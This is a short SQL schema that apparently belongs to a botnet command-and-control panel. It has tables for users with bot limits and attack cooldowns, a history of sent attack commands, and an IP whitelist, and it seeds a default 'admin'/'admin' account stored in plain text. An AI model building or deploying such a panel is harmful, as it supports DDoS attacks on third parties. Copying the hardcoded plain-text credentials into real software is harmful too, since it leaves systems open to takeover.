CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(32) NOT NULL UNIQUE,
    password VARCHAR(32) NOT NULL,
    max_bots INT NOT NULL DEFAULT 1000,
    admin INT NOT NULL DEFAULT 0,
    last_paid BIGINT NOT NULL DEFAULT 0,
    cooldown INT NOT NULL DEFAULT 0,
    duration_limit INT NOT NULL DEFAULT 0,
    wrc INT NOT NULL DEFAULT 0,
    intvl INT NOT NULL DEFAULT 30,
    api_key VARCHAR(64) NOT NULL DEFAULT ''
);

CREATE TABLE IF NOT EXISTS history (
    id SERIAL PRIMARY KEY,
    user_id INT NOT NULL,
    time_sent BIGINT NOT NULL,
    duration INT NOT NULL,
    command TEXT NOT NULL,
    max_bots INT NOT NULL
);

CREATE TABLE IF NOT EXISTS whitelist (
    id SERIAL PRIMARY KEY,
    prefix VARCHAR(32) NOT NULL,
    netmask SMALLINT NOT NULL
);

INSERT INTO users (username, password, max_bots, admin, api_key)
VALUES ('admin', 'admin', 9999, 1, 'ixf-lab-api-key')
ON CONFLICT (username) DO NOTHING;
